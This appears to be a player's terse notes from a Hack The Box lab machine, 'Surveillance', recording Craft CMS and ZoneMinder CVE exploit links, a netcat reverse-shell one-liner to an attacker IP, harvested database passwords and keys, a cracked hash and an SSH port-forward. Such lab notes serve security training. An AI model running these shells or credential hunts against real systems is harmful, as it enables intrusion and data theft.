COMMON
-----
https://github.com/y3rb1t4/htb-arg/blob/main/00-my-notes/shell-interactive.md


USER FLAG
-----
OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)

HTTP/1.1 302 Moved Temporarily
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 12 Feb 2024 02:27:22 GMT
Content-Type: text/html
Content-Length: 154
Connection: keep-alive
Location: http://surveillance.htb/
Powered by Craft CMS

CVE-2023-41892
https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.137 4444 >/tmp/f
user: matthew
user: zoneminder
ports: 22, 8080, 3306

/usr/share/zoneminder/www/api/app/Config/database.php:          'password' => 'ZoneMinderP│
assword2023',                                                                             │
/usr/share/zoneminder/www/api/app/Config/database.php:          'password' => ZM_DB_PASS, │
/usr/share/zoneminder/www/includes/config.php:  'Password'  => '',

-rw-r--r-- 1 root root 22864 Feb 12 19:41 /var/log/nginx/access.log                                                                                                                 
-rw-r--r-- 1 root root 87 Feb 12 19:41 /var/log/zm/access.log

-rw-r--r-- 1 root zoneminder 5265 Nov 18  2022 /usr/share/zoneminder/www/ajax/modals/storage.php                                                                                    
-rw-r--r-- 1 root zoneminder 1249 Nov 18  2022 /usr/share/zoneminder/www/includes/actions/storage.php                                                                               

-rw-r--r-- 1 root zoneminder 3503 Oct 17 11:32 /usr/share/zoneminder/www/api/app/Config/database.php                                                                                                       
                'user' => 'zmuser',                    

                'host' => 'localhost',                                                                                                                                              
                'password' => 'ZoneMinderPassword2023',                                                                                                                             
                'database' => 'zm',                                                                                                            
-rw-r--r-- 1 root zoneminder 11257 Nov 18  2022 /usr/share/zoneminder/www/includes/database.php

CRAFT_APP_ID=CraftCMS--070c5b0b-ee27-4e50-acdf-0436a93ca4c7                                         
CRAFT_ENVIRONMENT=production                                            
CRAFT_SECURITY_KEY=2HfILL3OAEe5X0jzYOVY5i7uUizKmB2_                                                
CRAFT_DB_DRIVER=mysql                                                  
CRAFT_DB_SERVER=127.0.0.1                               
CRAFT_DB_PORT=3306                                                
CRAFT_DB_DATABASE=craftdb                                                
CRAFT_DB_USER=craftuser                                                
CRAFT_DB_PASSWORD=CraftCMSPassword2023!                                                    
CRAFT_DB_SCHEMA=                                                
CRAFT_DB_TABLE_PREFIX=                                                     
DEV_MODE=false                                                 
ALLOW_ADMIN_CHANGES=false                                             
DISALLOW_ROBOTS=false                                                     
PRIMARY_SITE_URL=http://surveillance.htb/

39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec
https://hashes.com/en/tools/hash_identifier
https://md5decrypt.net/en/Sha256/
starcraft122490

ROOT FLAG
-----
/usr/share/zoneminder
https://phoenixnap.com/kb/ssh-port-forwarding

ssh -L 1111:127.0.0.1:8080 matthew@surveillance.htb

matthew@surveillance:/usr/share/zoneminder/www/api/app/Config$ cat *.php | grep -i "Version"
Configure::write('ZM_VERSION', '1.36.32');
Configure::write('ZM_API_VERSION', '1.36.32.1');

https://github.com/rvizx/CVE-2023-26035

Investigate: 
zmaudit.pl
zmcontrol.pl
zmdc.pl
zmfilter.pl
zmonvif-probe.pl
zmonvif-trigger.pl
zmpkg.pl
zmmrecover.pl
zmstats.pl
zmsystemctl.pl
zmtelemetry.pl
zmtrack.pl
zmtrigger.pl
zmupdate.pl
zmvideo.pl
zmwatch.pl